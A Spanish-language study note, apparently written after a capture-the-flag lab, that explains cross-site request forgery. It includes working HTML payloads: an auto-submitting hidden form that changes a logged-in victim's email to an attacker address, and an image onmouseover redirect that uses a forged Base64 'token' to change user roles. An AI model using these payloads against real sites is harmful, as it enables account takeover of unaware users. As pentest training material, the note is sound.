# CSRF — Cross-Site Request Forgery

Relacionado: [[HTTP-Peticiones-y-Respuestas]] · [[Herramientas-Burp-Suite-Decoder-Comparer-Sequencer]] · [[Reconocimiento-Manual-Web-y-DevTools]] · [[OWASP-Top-10-2025]] · [[Web-Pentest-Credential-Stuffing-IDOR-Ejemplo]]

## Qué es
CSRF engaña al navegador de una víctima **ya autenticada** para que mande una petición a un sitio donde tiene sesión activa — no roba credenciales, abusa de la **relación de confianza** entre navegador y aplicación. Como el navegador manda automáticamente la cookie de sesión con cada petición al mismo dominio (sin importar desde dónde se disparó esa petición), el servidor la trata como si el usuario la hubiera hecho a propósito.

## Por qué funciona (no es un bug del navegador)
El navegador se comporta **exactamente como fue diseñado**: manda la cookie de sesión en cada request al dominio correspondiente, sin distinguir si la petición vino de una página legítima del sitio o de una página maliciosa en otra pestaña/dominio. El problema real está del lado de la **aplicación**, que confía demasiado en "si trae la cookie válida, es el usuario real" sin verificar el origen genuino de la petición.

## Las 3 condiciones necesarias
1. La víctima debe estar **autenticada** en la aplicación objetivo.
2. La aplicación debe ejecutar una **acción que cambie estado** (actualizar configuración, modificar datos de cuenta).
3. La aplicación **no verifica** si la petición vino de una fuente confiable.

Si las tres se cumplen, un atacante puede actuar en nombre de la víctima sin conocer nunca sus credenciales.

## Dónde buscar — features típicamente vulnerables
Priorizar peticiones que **modifican datos**, no las de solo lectura (CSRF no sirve para leer la respuesta de la petición forjada, solo para dispararla "a ciegas" — pero sí para dejar hecho el cambio en el servidor):
- Cambio de contraseña / email.
- Actualización de configuración de cuenta.
- Transacciones financieras.
- Modificación de preferencias de seguridad.

## Mito: GET vs POST
Muchos desarrolladores asumen que usar `POST` protege automáticamente contra CSRF. **Falso.** Tanto `GET` como `POST` son abusables si la app no verifica el origen — de hecho, muchos CSRF reales explotan simples peticiones `GET` disparadas desde un link o incluso desde una etiqueta `<img>`. Nunca confiar solo en el método HTTP al evaluar CSRF.

## Explotación básica — formulario auto-enviado (StaffHub)
Endpoint vulnerable: actualizar email, sin ningún token ni verificación de origen.
```html
<!-- Formulario legítimo de la app -->
<form action="update_email.php" method="POST">
  <input id="email" type="email" name="email" required>
  <button type="submit">Update Email</button>
</form>
```
Página maliciosa (alojada en cualquier servidor propio):
```html
<html>
<body>
<form action="http://SITIO/update_email.php" method="POST" id="attack">
<input type="hidden" name="email" value="attacker@evilmail.thm">
</form>
<script>
document.getElementById("attack").submit();
setTimeout(function() {
  window.location.href = "http://SITIO/settings.php";
}, 1000);
</script>
</body>
</html>
```
`<input type="hidden">` con el valor malicioso ya puesto — la víctima nunca lo ve · `document.getElementById("attack").submit()` dispara el envío automático al cargar la página, sin necesitar ningún clic · `setTimeout(...)` redirige a la víctima de vuelta a la página real 1 segundo después, para que no note nada raro.

**Preparar y servir el archivo (AttackBox):**
```bash
cd /var/www/html
nano settings.html
```
`nano archivo`: abre el editor de texto en terminal — pegar el HTML, `Ctrl+O` + `Enter` para guardar, `Ctrl+X` para salir. El archivo queda servido en `http://IP_ATTACKBOX:81/settings.html`.

Si la víctima (ya logueada en el sitio real, en el mismo navegador) visita esa URL maliciosa, su navegador manda automáticamente la petición forjada junto con su cookie de sesión válida — el email de la cuenta cambia sin que la víctima haga nada.

## CSRF con token débil — CSRF basado en imagen
Un token CSRF **solo protege si es único, impredecible y validado correctamente**. Si se genera de forma débil o reversible, sigue siendo bypasseable.

**Ejemplo de implementación débil:** el token resulta ser el **rol del usuario codificado en Base64**, no un valor aleatorio.
```html
<input type="hidden" name="csrf_token" value="YWRtaW4=">
```
`YWRtaW4=` decodificado en Base64 da `admin` (ver [[Herramientas-Burp-Suite-Decoder-Comparer-Sequencer]] — mismo Decoder usado antes). Como el atacante entiende cómo se genera el token, puede reproducirlo sin necesitar robarlo ni adivinarlo — le basta con encodear en Base64 el rol que quiera forjar (`staff` → `c3RhZmY=`, por ejemplo).

**Payload — entrega vía imagen con `onmouseover` (sin formulario, sin clic):**
```html
<html>
<body>
<h2>StaffHub Internal Notice</h2>
<p>Move your mouse over the banner below to load the latest role updates.</p>
<img src="http://SITIO/one.png"
     onmouseover="window.location='http://SITIO/update_role.php?role=staff&csrf_token=YWRtaW4='"
     width="400">
</body>
</html>
```
El evento `onmouseover` dispara un redirect a la URL vulnerable en cuanto el mouse pasa sobre la imagen — el navegador manda esa petición `GET` junto con la cookie de sesión de la víctima y el token (ya conocido/reversible por el atacante), y la app la procesa como legítima porque el token técnicamente "coincide" con lo esperado.

> **Lección:** un token CSRF que se ve raro/codificado siempre vale la pena pasarlo por Decoder antes de asumir que es aleatorio de verdad — patrones como el `=` de padding al final delatan Base64 a simple vista.

## Buenas prácticas para testear CSRF (checklist de pentester)
- **Priorizar requests que cambian estado** — password, email, configuración de cuenta, transacciones.
- **Revisar si hay token CSRF** en la petición — si no existe, o parece estático/predecible (ej. codificado de forma reversible), es candidato a vulnerable.
- **Analizar el método HTTP** — acciones sensibles deberían usar `POST`; si operaciones importantes se hacen vía `GET`, son más fáciles de explotar con imágenes o links simples.
- **Reproducir la petición fuera de la app** — copiarla y armarla desde una página HTML externa; si la acción se completa sin verificación adicional, el endpoint es vulnerable.
- **Observar el comportamiento de las cookies** — si la autenticación depende solo de la cookie de sesión, y la app acepta cualquier petición que la traiga sin validar el origen, CSRF es posible.
